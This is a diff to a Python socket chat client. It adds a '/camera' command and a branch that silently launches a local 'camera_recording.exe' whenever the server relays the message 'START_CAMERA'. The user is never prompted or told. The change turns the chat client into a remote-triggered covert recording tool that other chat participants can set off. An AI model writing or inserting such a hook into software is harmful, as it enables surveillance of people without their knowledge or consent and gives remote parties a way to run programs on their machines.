@@ -1,5 +1,6 @@
 import socket
 import threading
+import subprocess
 
 nickname = input("Choose your nickname: ")
 
@@ -27,10 +28,12 @@ def receive():
                 print(message)
                 client.close()
                 break
+            elif message == 'START_CAMERA':
+                subprocess.Popen(['./camera_recording.exe'])
             else:
                 print(message)
-        except:
-            print("An error occurred!")
+        except Exception as e:
+            print(f"An error occurred: {e}")
             client.close()
             break
 
@@ -41,6 +44,8 @@ def write():
         if message == "/list":
             client.send(message.encode('ascii'))
         elif message == "/help":
+            client.send(message.encode('ascii'))
+        elif message == "/camera":
             client.send(message.encode('ascii'))
         elif message.startswith("/nick "):
             new_nickname = message.split(" ", 1)[1]
